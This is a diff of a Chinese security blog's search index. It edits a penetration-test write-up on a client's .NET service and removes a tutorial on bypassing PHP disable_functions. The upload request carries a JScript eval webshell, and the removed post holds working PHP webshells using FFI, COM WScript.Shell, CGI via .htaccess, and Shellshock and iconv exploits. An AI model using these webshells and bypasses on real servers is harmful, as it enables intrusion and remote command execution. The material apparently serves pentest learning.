@@ -5,42 +5,41 @@
     <url>/posts/34084a97/</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>某次项目中客户要求在互联网侧进行渗透测试，奈何肝了两天也没找到个高危漏洞，没办法太菜了。</p>
 <p>偶然间端口扫描后，扫目录发现了两个bin.rar，这下和客户有得交代了！！！</p>
-<p><img src="/posts/34084a97/attachment:44e7a99ce330cfea32f5c230c7afef46" alt="截图"></p>
+<p><img src="/posts/34084a97/1.png" alt="image-20240222171901823"></p>
 <p>解压后为多个dll文件，使用ILspy进行反编译Android.dll</p>
-<p><img src="/posts/34084a97/attachment:b28c7a8b861c6151c7698585278bd4a4" alt="截图"></p>
+<p><img src="/posts/34084a97/2.png" alt="image-20240222171920337"></p>
 <h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>开始 .net代码审计</p>
-<p><img src="/posts/34084a97/attachment:3c9ca57890e0d4e349d71f65f935dedd" alt="截图"></p>
-<p><img src="/posts/34084a97/attachment:fe40ed850486ebf0f2d9b3dc1c357c48" alt="截图"></p>
+<p><img src="/posts/34084a97/3.png" alt="截图"></p>
+<p><img src="/posts/34084a97/4.png" alt="image-20240222171947564"></p>
 <h3 id="日志泄露"><a href="#日志泄露" class="headerlink" title="日志泄露"></a>日志泄露</h3><p>代码审计后发现存在一个 log.txt 日志泄露  记录着请求日志</p>
-<p><img src="/posts/34084a97/attachment:a7549aa3e80fc0ab3d69be1e2624c919" alt="截图"></p>
-<p><img src="/posts/34084a97/attachment:f943587161a99543ff1ddf29827ebfa7" alt="截图"></p>
-<h3 id="未授权文件上传服务"><a href="#未授权文件上传服务" class="headerlink" title="未授权文件上传服务"></a>未授权文件上传服务</h3><p><img src="/posts/34084a97/attachment:a0191b334809206943e985c1bc4937e7" alt="截图"></p>
-<p>访问 <a href="http://xx.xx.xx.xx/UploadByFile.aspx">http://xx.xx.xx.xx/UploadByFile.aspx</a>  通过读源码已经给出了上传密码lk，输入密码后可以上传到人员指定目录下 <img src="/posts/34084a97/attachment:17632dd1892ace8ead003cf9f1810290" alt="截图"></p>
-<h3 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h3><p><img src="/posts/34084a97/attachment:509d38a45fa843705ff62408b141322d" alt="截图"></p>
+<p><img src="/posts/34084a97/5.png" alt="image-20240222171959681"></p>
+<p><img src="/posts/34084a97/6.png" alt="image-20240222172017042"></p>
+<h3 id="未授权文件上传服务"><a href="#未授权文件上传服务" class="headerlink" title="未授权文件上传服务"></a>未授权文件上传服务</h3><p><img src="/posts/34084a97/7.png" alt="image-20240222172109037"></p>
+<p>访问 <a href="http://xx.xx.xx.xx/UploadByFile.aspx">http://xx.xx.xx.xx/UploadByFile.aspx</a>  通过读源码已经给出了上传密码lk，输入密码后可以上传到人员指定目录下</p>
+<p> <img src="/posts/34084a97/8.png" alt="image-20240222172122212"></p>
+<h3 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h3><p><img src="/posts/34084a97/9.png" alt="image-20240222172142497"></p>
 <p>构造文件上传数据包进行fuzz  会上传到/UpPhoto 目录下</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /UploadAndroid.aspx HTTP/1.1</span><br><span class="line">Host: xx.xx.xx.xx:8500</span><br><span class="line">Content-Length: 345</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: null</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryGxb4OzDF9eaemiFU</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh,zh-CN;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryGxb4OzDF9eaemiFU</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;1.aspx&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</span><br><span class="line">------WebKitFormBoundaryGxb4OzDF9eaemiFU</span><br></pre></td></tr></table></figure>
 
-
-
-<p><img src="/posts/34084a97/attachment:9a6f3979b3ed1f4fc58729ef68fd5130" alt="截图"></p>
+<p><img src="/posts/34084a97/10.png" alt="image-20240222172158143"></p>
 <p>上传成功连接蚁剑 getshell</p>
-<p><img src="/posts/34084a97/attachment:223a8a0ad918b603355e39182278575f" alt="截图"></p>
+<p><img src="/posts/34084a97/11.png" alt="image-20240222172210227"></p>
 <h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>两个泄露的dll中都存在很多sql注入，没有进行过滤处理，推测这两个端口服务均为API接口</p>
-<p><img src="/posts/34084a97/attachment:bcd43a7783572f2bbe033f11eae4c159" alt="截图"></p>
+<p><img src="/posts/34084a97/12.png" alt="image-20240222172224240"></p>
 <p>此处 strYear 未经过处理 存在sql注入  <a href="http://xx.xx.xx.xx:85/GetInfoxxxx.aspx?year=2">http://xx.xx.xx.xx:85/GetInfoxxxx.aspx?year=2</a></p>
 <p>还存在其他多处注入点</p>
-<p><img src="/posts/34084a97/attachment:80a1bc9a809680ee5ff4c28d1d0322c7" alt="截图"></p>
-<p><img src="/posts/34084a97/attachment:b7b67f26b9fe6a5a20b1d43eb12e813b" alt="截图"></p>
+<p><img src="/posts/34084a97/13.png" alt="image-20240222172236311"></p>
+<p><img src="/posts/34084a97/14.png" alt="image-20240222172248521"></p>
 <hr>
 <p>在另一处端口代码泄露中也存在多处sql注入 未经过处理的地方很多就不在列举。。。基本上strXX、XXID、year、data都可以注入</p>
-<p><img src="/posts/34084a97/attachment:7726004a2ae621cbc741025a6d4690df" alt="截图"></p>
-<p><img src="/posts/34084a97/attachment:54b1e75f113a4605e06f1decd2b8abac" alt="截图"></p>
+<p><img src="/posts/34084a97/15.png" alt="image-20240222172300435"></p>
+<p><img src="/posts/34084a97/16.png" alt="image-20240222172313086"></p>
 <p><a href="http://xx.xx.xx.xx/XXXX/XXXX/GetFileReviewEdit.aspx?strFWID=1">http://xx.xx.xx.xx:80/XXXX/XXXX/GetFileReviewEdit.aspx?strFWID=1</a></p>
 <p><a href="http://xx.xx.xx.xx/XXXX/XXXX/GetFileReviewList.aspx?strName=1">http://xx.xx.xx.xx:80/XXXX/XXXX/GetFileReviewList.aspx?strName=1</a></p>
-<p><img src="/posts/34084a97/attachment:e77a25a383c05e1027f53e9437433517" alt="截图"></p>
-<p><img src="/posts/34084a97/attachment:d81cfd4d4948efbb491cff7993d468a9" alt="截图"></p>
+<p><img src="/posts/34084a97/17.png" alt="image-20240222172322699"></p>
+<p><img src="/posts/34084a97/18.png" alt="image-20240222172333809"></p>
 <p>sqlmap可以直接注入获取数据并os-shell</p>
-<p><img src="/posts/34084a97/attachment:37884090b974cc28b17224ae2b3d524d" alt="截图"></p>
+<p><img src="/posts/34084a97/19.png" alt="image-20240222172347493"></p>
 <p>除了以上之外 也有多处敏感信息泄露，这里便不再列举。。</p>
 ]]></content>
   </entry>
@@ -5617,125 +5616,6 @@
 <p><img src="/posts/d8527941/13.png"></p>
 <p>第一行的地址为 1000h  即BaseOfCode （代码基址地址）</p>
 <p>前面为1000 0000h 即 ImageBase（dll默认为 0x10000000h）</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>Disable_functions绕过</title>
-    <url>/posts/9087228f/</url>
-    <content><![CDATA[<p>放了很久了 2023-03-11写的… </p>
-<p>通常情况下 导致webshell不能执行命令又三类原因:</p>
-<ul>
-<li><ol>
-<li>php.ini中使用disable_funcitons禁用了system() exec()等命令执行的函数</li>
-</ol>
-</li>
-<li><ol start="2">
-<li>有WAF拦截</li>
-</ol>
-</li>
-<li><ol start="3">
-<li>web进程运行在rbash类受限制的shell环境下</li>
-</ol>
-</li>
-</ul>
-<p>如果是第一种则无法执行任何命令，另外两种可以执行少量命令。<br>在拿到的有些 webshell中，在执行命令时返回  ret=127，这是由于disable_functions 的限制，最近有面试官问到过这个问题，但是由于很久没接触，以前大多是使用蚁剑插件绕过，在总结复现学习下bypass技巧。</p>
-<h4 id="Disable-functions"><a href="#Disable-functions" class="headerlink" title="Disable_functions"></a>Disable_functions</h4><p>disable_functions 是 php.ini中的一个设置选项，可以用来设置php环境禁止使用某些函数，主要是用来禁止某些能够执行危险命令的函数<br><img src="/posts/9087228f/1.png"><br>通常在拿到一个webshell 使用管理工具连接执行命令却返回 ret=127  这种就是被disable_functions 所限制了。</p>
-<h4 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h4><p>有些运维人员可能没有将php命令执行的函数禁用完，</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open</span><br></pre></td></tr></table></figure>
-
-<h4 id="利用PHP-7-4-FFI-绕过"><a href="#利用PHP-7-4-FFI-绕过" class="headerlink" title="利用PHP 7.4 FFI 绕过"></a>利用PHP 7.4 FFI 绕过</h4><h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><blockquote>
-<ol>
-<li>Linux 操作系统</li>
-<li>PHP&gt;= 7.4</li>
-<li>开启了FFI拓展且 ffi.enable=true</li>
-</ol>
-</blockquote>
-<h5 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h5><p>FFI（Foreign Function Interface），即外部函数接口，允许从用户区调用C代码。简单地说，就是一项让你在PHP里能够调用C代码的技术。<br>当所有的PHP命令执行的函数被禁用后，可以用过PHP7.4的新特性FFI调用C代码的方式。<br>先声明C中的命令执行函数「system()」，在通过FFI变量调用system() 绕过PHP中的system函数<br>查看FFI是否开启  ffi.enable 设置为TRUE<br><img src="/posts/9087228f/2.png"></p>
-<h5 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h5><p>使用  FFI::cdef  //创建一个新的FFI对象<br>通过C 的 system()去执行命令</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="string">&quot;<span class="subst">$cmd</span> &gt; /tmp/SD&quot;</span>);       <span class="comment">//由GET传参的任意代码执行</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/tmp/SD&quot;</span>);</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;/tmp/SD&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>访问  ip/1.php?cmd=whoami </p>
-<h4 id="利用Linux环境变量-LD-PRELOAD绕过"><a href="#利用Linux环境变量-LD-PRELOAD绕过" class="headerlink" title="利用Linux环境变量 LD_PRELOAD绕过"></a>利用Linux环境变量 LD_PRELOAD绕过</h4><h5 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h5><p>LD_PRELOAD是Linux系统的一个环境变量，用于动态库的加载<br>一般情况下动态库的搜索顺序：</p>
-<ul>
-<li>编译目标代码时知道的动态库搜索路径LD_PRELOAD</li>
-<li>环境变量LD_LIBRARY_PATH指定的动态库搜索路径</li>
-<li>配置文件/etc/ld.so.conf中指定的动态库搜索路径</li>
-<li>默认的动态库搜索路径 /lib</li>
-<li>默认的动态库搜索路径 /usr/lib</li>
-</ul>
-<p>LD_PRELOAD的优先级最高，因而可以影响程序运行时的链接，运行程序运行前优先加载动态链接库。<br>可以通过环境变量LD_PRELOAD劫持系统函数，可以达到不调用PHP的各种命令执行函数「system() exec()等」仍可执行系统命令的目的。</p>
-<h5 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h5><p>1.本地伪造.c 文件劫持某个函数并生成一个动态链接库.so 文件<br>2.上传文件到服务器有权限的目录下<br>3.利用php中的putenv()设置LD_PRELOAD路径为该文件<br>4.配合php中某个函数去厨房构造的动态链接库 .so文件<br>5.执行命令</p>
-<h5 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h5><p>PHP支持putenv() mail()函数  「无需安装sendmail」<br>文章可见 <a href="https://www.freebuf.com/web/192052.html">https://www.freebuf.com/web/192052.html</a></p>
-<h5 id="利用方法-1"><a href="#利用方法-1" class="headerlink" title="利用方法"></a>利用方法</h5><p>项目地址: <a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a><br>该项目中有三个关键文件，bypass_disablefunc.php、bypass_disablefunc_x64.so、bypass_disablefunc_x86.so。 </p>
-<blockquote>
-<p>bypass_disablefunc.php 为命令执行 webshell，提供三个 GET 参数：<br><a href="http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so">http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so</a><br>cmd参数 执行命令<br>outpath参数 保存命令执行输出结果的文件路径「注意 web 是否有读写权限、web 是否可跨目录访问、文件将被覆盖和删除等几点」<br>sopath参数  指定劫持系统函数的共享对象的绝对路径</p>
-</blockquote>
-<p>将 bypass_disablefunc.php 和 bypass_disablefunc_x64.so 传到目标有权限的目录下，指定好三个 GET 参数后，并用include去包含bypass_disablefunc.php 即可突破 disable_functions。</p>
-<h4 id="利用Windows-COM组件绕过"><a href="#利用Windows-COM组件绕过" class="headerlink" title="利用Windows COM组件绕过"></a>利用Windows COM组件绕过</h4><h5 id="利用条件-2"><a href="#利用条件-2" class="headerlink" title="利用条件"></a>利用条件</h5><blockquote>
-<p>1.Windows环境<br>2.开启COM组件「5.4自带 其他版本自行添加」</p>
-</blockquote>
-<p><img src="/posts/9087228f/3.png"><br>如果在phpinfo中 com_dotnet下  com.allow_dcom   表示COM组件开启。可以直接实例化一个COM对象，通过调用对象方法来执行系统命令以绕过disable_functions</p>
-<h5 id="利用方法-2"><a href="#利用方法-2" class="headerlink" title="利用方法"></a>利用方法</h5><p>上传php脚本 后传参执行命令</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$wsh</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wsh&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;wsh&#x27;</span>] : <span class="string">&#x27;wscript&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$wsh</span> == <span class="string">&#x27;wscript&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$command</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="variable">$wshit</span> = <span class="keyword">new</span> <span class="title function_ invoke__">COM</span>(<span class="string">&#x27;WScript.shell&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Create Wscript.Shell Failed!&quot;</span>); <span class="comment">//生成一个COM对象</span></span><br><span class="line">    <span class="variable">$exec</span> = <span class="variable">$wshit</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="string">&quot;cmd /c&quot;</span>.<span class="variable">$command</span>);	<span class="comment">//调用对象方法来执行命令</span></span><br><span class="line">    <span class="variable">$stdout</span> = <span class="variable">$exec</span>-&gt;<span class="title function_ invoke__">StdOut</span>();</span><br><span class="line">    <span class="variable">$stroutput</span> = <span class="variable">$stdout</span>-&gt;<span class="title function_ invoke__">ReadAll</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$stroutput</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="variable">$wsh</span> == <span class="string">&#x27;application&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$command</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="variable">$wshit</span> = <span class="keyword">new</span> <span class="title function_ invoke__">COM</span>(<span class="string">&quot;Shell.Application&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Shell.Application Failed!&quot;</span>);</span><br><span class="line">    <span class="variable">$exec</span> = <span class="variable">$wshit</span>-&gt;<span class="title function_ invoke__">ShellExecute</span>(<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/c &quot;</span>.<span class="variable">$command</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="利用攻击PHP-FPM"><a href="#利用攻击PHP-FPM" class="headerlink" title="利用攻击PHP-FPM"></a>利用攻击PHP-FPM</h4><h5 id="利用条件-3"><a href="#利用条件-3" class="headerlink" title="利用条件"></a>利用条件</h5><blockquote>
-<ol>
-<li>Linux操作系统</li>
-<li>PHP-FPM</li>
-<li>存在可写目录 需上传.so文件</li>
-</ol>
-</blockquote>
-<h5 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h5><p><a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/5">https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/5</a></p>
-<blockquote>
-<p>git clone <a href="https://github.com/AntSwordProject/AntSword-Labs.git">https://github.com/AntSwordProject/AntSword-Labs.git</a><br>cd AntSword-Labs/bypass_disable_functions/5<br>docker-compose up -d</p>
-</blockquote>
-<h5 id="利用方法-3"><a href="#利用方法-3" class="headerlink" title="利用方法"></a>利用方法</h5><p>连接shell后无法执行命令<br><img src="/posts/9087228f/4.png"><br>通过phpinfo 发现该主机配置了 FPM/Fastcgi<br><img src="/posts/9087228f/5.png"><br>使用插件<br>需要先找到FPM接口地址<br><img src="/posts/9087228f/6.png"><br><img src="/posts/9087228f/7.png"><br>随后在 /var/www/html/ 目录下便新建了一个 .antproxy.php文件「ant」 连接shell后便可执行命令<br><img src="/posts/9087228f/8.png"></p>
-<h4 id="利用Apache-Mod-CGI"><a href="#利用Apache-Mod-CGI" class="headerlink" title="利用Apache Mod CGI"></a>利用Apache Mod CGI</h4><h5 id="利用条件-4"><a href="#利用条件-4" class="headerlink" title="利用条件"></a>利用条件</h5><blockquote>
-<ol>
-<li>Linux操作系统</li>
-<li>Apache + PHP「Apache使用 apache_mod_php」</li>
-<li>Apche开启 cgi和rewrite</li>
-<li>Web目录具有AllowOverride 权限</li>
-<li>当前目录可写</li>
-</ol>
-</blockquote>
-<h5 id="关于mod-cgi"><a href="#关于mod-cgi" class="headerlink" title="关于mod_cgi"></a>关于mod_cgi</h5><p><a href="http://httpd.apache.org/docs/current/mod/mod_cgi.html">http://httpd.apache.org/docs/current/mod/mod_cgi.html</a><br>任何具有MIME类型application/x-httpd-cgi或者被cgi-script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。<br>可以通过两种途径使文件成为CGI脚本，一种是文件具有已由AddType指令定义的扩展名，另一种是文件位于ScriptAlias目录中。<br>当Apache 开启了cgi, rewrite时，可以利用.htaccess文件，临时允许一个目录可以执行cgi程序并且使得服务器将自定义的后缀解析为cgi程序，则可以在目的目录下使用.htaccess文件进行配置。</p>
-<h5 id="利用方法-4"><a href="#利用方法-4" class="headerlink" title="利用方法"></a>利用方法</h5><p>1.在web目录下上传一个 .htaccess 文件</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .ant</span><br></pre></td></tr></table></figure>
-
-<p>2.上传shell.ant</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="keyword">echo</span> Content-type: text/html</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">echo</span>&amp;&amp;id</span><br></pre></td></tr></table></figure>
-
-<p>直接访问 shell.ant 会报错，是因为权限问题<br><img src="/posts/9087228f/9.png"><br>3.使用蚁剑直接修改权限 从0644-&gt; 0777<br><img src="/posts/9087228f/10.png"><br>再次访问即可<br><img src="/posts/9087228f/11.png"></p>
-<hr>
-<p>使用蚁剑插件的方式<br><img src="/posts/9087228f/12.png"><br>点击开始后 会创建 一个新的 虚拟终端<br><img src="/posts/9087228f/13.png"><br>可以直接执行命令<br><img src="/posts/9087228f/14.png"></p>
-<h4 id="利用ShellShock-CVE-2014-6271"><a href="#利用ShellShock-CVE-2014-6271" class="headerlink" title="利用ShellShock CVE-2014-6271"></a>利用ShellShock CVE-2014-6271</h4><h5 id="利用条件-5"><a href="#利用条件-5" class="headerlink" title="利用条件"></a>利用条件</h5><blockquote>
-<ol>
-<li>Linux 操作系统</li>
-<li>putenv</li>
-<li>mail or  error_log 不被禁用</li>
-<li>/bin/bash 存在 CVE-2014-6271漏洞 (bash&lt;=4.3)/bin/sh -&gt; /bin/bash  sh默认的shell是bash</li>
-<li>PHP &lt; 5.6.2</li>
-</ol>
-</blockquote>
-<h5 id="利用方法-5"><a href="#利用方法-5" class="headerlink" title="利用方法"></a>利用方法</h5><p>测试是否存在该漏洞<br>命令行输入 env x=’() { :;}; echo vulnerable’ bash -c “echo this is a test”<br>如果输出 vulnerable 说明存在该漏洞<br><img src="/posts/9087228f/15.png"></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">runcmd</span>(<span class="params"><span class="variable">$c</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$d</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> &amp;&amp; <span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;putenv&#x27;</span>) &amp;&amp; (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;error_log&#x27;</span>) || <span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;mail&#x27;</span>)))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="title function_ invoke__">readlink</span>(<span class="string">&quot;/bin/sh&quot;</span>), <span class="string">&quot;bash&quot;</span>)!=<span class="literal">FALSE</span>)&#123;</span><br><span class="line">      <span class="variable">$tmp</span>=<span class="title function_ invoke__">tempnam</span>(<span class="title function_ invoke__">sys_get_temp_dir</span>(), <span class="string">&#x27;as&#x27;</span>);</span><br><span class="line">      <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$c</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;error_log&#x27;</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">error_log</span>(<span class="string">&quot;a&quot;</span>, <span class="number">1</span>);</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">mail</span>(<span class="string">&quot;a@127.0.0.1&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;-bv&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">print</span>(<span class="string">&quot;Not vuln (not bash)\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$output</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp</span>);</span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="variable">$tmp</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$output</span>!=<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">      <span class="keyword">print</span>(<span class="variable">$output</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">print</span>(<span class="string">&quot;No output, or not vuln.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;不满足使用条件&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// runcmd(&quot;whoami&quot;); // 要执行的命令</span></span><br><span class="line"><span class="title function_ invoke__">runcmd</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>]); <span class="comment">// ?cmd=whoami</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>上传该exp_cve2014-6271.php 到目标主机<br>包含文件即可<br><img src="/posts/9087228f/16.png"><br>在蚁剑虚拟终端上已经集成了对ShellShock的利用 可以在终端上直接执行命令</p>
-<h4 id="利用iconv拓展17"><a href="#利用iconv拓展17" class="headerlink" title="利用iconv拓展17"></a>利用iconv拓展17</h4><h5 id="利用条件-6"><a href="#利用条件-6" class="headerlink" title="利用条件"></a>利用条件</h5><blockquote>
-<ol>
-<li>Linux操作系统</li>
-<li>putenv</li>
-<li>iconv</li>
-<li>存在可写目录 上传.so文件</li>
-<li>相比LD_PRELOAD环境下 多禁用了error_log</li>
-</ol>
-</blockquote>
-<h5 id="利用原理-1"><a href="#利用原理-1" class="headerlink" title="利用原理"></a>利用原理</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;GCONV_PATH=/tmp&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;payload&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="string">&quot;whatever&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>利用GCONV_PATH环境变量 加载 .so文件并在.so文件中执行命令<br>具体原理分析可见 <a href="https://hugeh0ge.github.io/2019/11/04/Getting-Arbitrary-Code-Execution-from-fopen-s-2nd-Argument/">https://hugeh0ge.github.io/2019/11/04/Getting-Arbitrary-Code-Execution-from-fopen-s-2nd-Argument/</a></p>
-<h5 id="利用方法-6"><a href="#利用方法-6" class="headerlink" title="利用方法"></a>利用方法</h5><p>直接使用蚁剑的插件<br><img src="/posts/9087228f/17.png"><br>可以看到在 var/www/html/目录下创建一个 .antproxy.php 的shell文件  连接后即可执行命令</p>
-<h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p><a href="https://blog.csdn.net/unexpectedthing/article/details/123782308">https://blog.csdn.net/unexpectedthing/article/details/123782308</a><br><a href="https://xz.aliyun.com/t/10057#toc-7">https://xz.aliyun.com/t/10057#toc-7</a><br>[<a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/]">https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/]</a></p>
 ]]></content>
   </entry>
   <entry>
